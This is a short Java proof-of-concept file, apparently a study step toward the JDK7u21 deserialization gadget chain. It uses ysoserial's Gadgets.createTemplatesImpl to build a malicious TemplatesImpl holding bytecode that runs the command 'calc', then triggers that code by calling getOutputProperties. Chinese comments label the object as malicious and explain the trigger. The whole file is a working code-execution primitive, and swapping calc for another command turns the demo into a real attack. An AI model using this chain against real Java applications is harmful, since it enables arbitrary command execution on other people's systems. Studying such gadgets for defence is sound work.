import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import ysoserial.payloads.util.Gadgets;

public class JDK7u21 {
    public static void main(String[] args) throws Exception {
        TemplatesImpl calc = (TemplatesImpl) Gadgets.createTemplatesImpl("calc");//生成恶意的calc
        calc.getOutputProperties();//调用getOutputProperties就可以执行calc
    }
}